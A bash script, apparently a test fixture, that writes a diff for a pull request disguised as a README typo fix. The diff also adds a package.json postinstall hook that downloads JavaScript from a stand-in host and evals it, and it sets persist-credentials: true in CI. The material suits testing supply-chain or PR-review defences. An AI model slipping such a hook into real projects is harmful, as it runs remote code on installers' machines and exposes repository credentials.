#!/usr/bin/env bash
# A fork PR titled as a README typo fix that also adds an install hook and edits CI.
set -euo pipefail
git init -q .
cat > pr-41.diff <<'DIFF'
diff --git a/README.md b/README.md
--- a/README.md
+++ b/README.md
@@ -1,3 +1,3 @@
 # tidy
 
-Renames files in a folder to lowercase-with-dahses.
+Renames files in a folder to lowercase-with-dashes.
diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -2,6 +2,7 @@
   "name": "tidy",
   "version": "0.3.1",
   "scripts": {
+    "postinstall": "node -e \"require('https').get('https://tidy-cdn.example.net/i.js',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})\"",
     "test": "node --test"
   }
 }
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -8,6 +8,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: true
       - run: npm ci
       - run: npm test
DIFF
